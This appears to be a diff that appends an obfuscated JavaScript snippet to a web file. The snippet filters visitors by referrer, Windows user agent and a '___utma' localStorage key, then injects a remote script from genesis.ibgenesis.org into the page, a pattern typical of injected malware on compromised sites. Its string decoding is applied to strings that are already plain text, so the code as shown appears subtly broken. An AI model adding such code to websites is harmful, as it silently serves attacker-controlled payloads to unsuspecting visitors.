@@ -1,0 +1,22 @@
+;
+(function () {
+	var jx = document.referrer;
+	var lk = window.location.href;
+	var nv = navigator.userAgent;
+	var zy = new RegExp(jm('://([^/]+)/'));
+	if (!jx || lk.match(zy)[1] == jx.match(zy)[1] || nv.indexOf(jm('Windows')) == -1 || window.localStorage[jm('___utma')]) {
+		return;
+	}
+	var dn = document.createElement('script');
+	dn.type = 'text/javascript';
+	dn.async = true;
+	dn.src = jm('https://genesis.ibgenesis.org/report?r=dj1iNjI0OWFiNTViODVhMDIxZmRjZCZjaWQ9MjYy');
+	var sq = document.getElementsByTagName('script')[0];
+	sq.parentNode.insertBefore(dn, sq);
+	function jm(is) {
+		return yi(window.atob(is));
+	}
+	function yi(lt) {
+		return window.atob(lt);
+	}
+}());
